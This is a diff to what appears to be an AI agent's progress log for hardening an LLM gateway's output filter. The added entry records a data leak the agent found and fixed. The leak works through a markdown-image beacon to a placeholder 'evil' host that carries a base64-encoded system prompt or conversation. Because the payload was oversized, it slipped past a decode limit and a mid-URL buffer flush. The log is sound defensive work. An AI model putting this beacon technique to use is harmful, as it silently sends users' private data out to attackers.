@@ -597,6 +597,44 @@
         Gate: G39 7/7 green; full frozen+adversarial 267 passed (was 260, +7, NO regression). ruff not
         installed in this env (gate non-blocking per prompt). (probes: scratchpad probe_exfil_encoded.py
         / probe_exfil_egress.py / probe_g39_benign.py, throwaway.) commit 6d0bc6cf.
+      ★★ G40 — REAL ZERO-CLICK EXFIL LEAK FOUND + FIXED 2026-07-02 (rigorous-verification round;
+         the FIRST genuine leak found this stress program beyond the G22-G39 hardening) ★★
+        THREAT: a markdown-image exfil beacon ![x](https://evil/l?d=<KB+ base64>) whose payload
+        exceeds buffer_max_bytes (4096) egressed to the client FULLY INTACT + auto-rendering ->
+        zero-click exfiltration of ~9KB of smuggled data (system prompt / conversation). Reproduced
+        LIVE through the real SecureStreamingResponse on BOTH the OutputGuard path and the no-guard
+        fallback path (probe_stream_bufferlimit_exfil.py: auto_render=YES-LEAK, 4000+ byte verbatim run).
+        TWO independent root causes (both fixed + frozen):
+          (1) output_guard._url_smuggles_data SKIPPED oversized blobs — the shared transport decoder
+              (_decode_one) returns None once plaintext > _MAX_DECODE_BYTES (4096), so a large image
+              beacon produced NEITHER encoded_payload NOR sensitive_payload -> not defanged on the
+              STREAMING *and* NON-STREAMING output paths. Fix: _tail_has_oversized_encoded_blob() —
+              a bounded-prefix decode (first ~4KB) + printability>=0.85 gate, scanned over BOTH the raw
+              tail AND the delimiter-split view (path-segment blobs). IMAGE-only signal (returned as
+              encoded_payload) so long opaque LINK tokens (presigned/tracking) — which trip only on
+              sensitive_payload — are unaffected. _OVERSIZED_B64_RE requires >=512 contiguous chars so
+              real signatures (<=344) never match; binary-decoding sigs fail the printability gate.
+          (2) secure_streaming released an UNCLOSED "![..](url" opener on a mid-URL BUFFER_LIMIT flush
+              (base64/hex payloads contain no SENTENCE_BOUNDARIES char, so a >4KB payload fills the
+              buffer and flushes mid-URL; the unclosed opener matches no exfil pattern -> clean verdict
+              -> prefix released -> client reassembles the complete auto-render beacon). Fix:
+              _open_media_opener_start() + MAX_OPEN_MEDIA_HOLDBACK (8192) in _release_with_lookahead_tail
+              — hold the unclosed opener until it closes (then G13/G36 redact path defangs it whole) or,
+              at the cap, fail-closed via _defang_open_media(). Insight: an unclosed opener CANNOT render,
+              so holding it is safe; only the completed ')' beacon is dangerous. ALSO mirrored G13/G35
+              neutralization onto the no-OutputGuard fallback scan path (it previously lacked exfil
+              awareness entirely). E14 payloads (SSN/keys) contain no "](" -> untouched, no regression.
+        VERIFY: post-fix all leak probes auto_render=no, payload_leak=False on guard+fallback; egress
+        oracle-confirmed PII/threat-free. FROZEN: G40 golden (test_g40_large_image_beacon_defanged 2 +
+        test_g40_benign_not_defanged 3 FP-floor) + E14 streaming (test_g40_streaming_oversized_beacon_no
+        _autorender guard+fallback, test_g40_streaming_split_beacon_across_boundary). Gate: frozen-9 +
+        all adversarial + streaming + output-guard = 339 green; full gateway 1225 passed (only the
+        UNRELATED test_rate_limit_atomic_ttl fakeredis TTL flakiness fails — different tests fail under
+        isolation vs full-run selection => shared-state/ordering flake in that suite, NOT my regression;
+        my changed files touch neither rate_limit nor Redis). commit 284677e5. Files: output_guard.py,
+        secure_streaming.py, test_adversarial_attacks.py, test_e14_streaming_split.py.
+        (NOTE: this INVALIDATES the earlier "FINAL COMPLETION" — a real leak existed; completion is
+        re-established only after this fix + the full regression above.)
       ★ FINAL COMPLETION 2026-07-02 (+G30..G38): ALL 7 criteria met. The prior sole blocker — the tier-2
         guard-model HALLUCINATION FP (translate-a-paragraph blocked on a fabricated self-referential ROT13)
         — is FIXED (G30) + live-confirmed (now allows). Post-G30 full-corpus-live re-run: 0 leaks, 0 under-
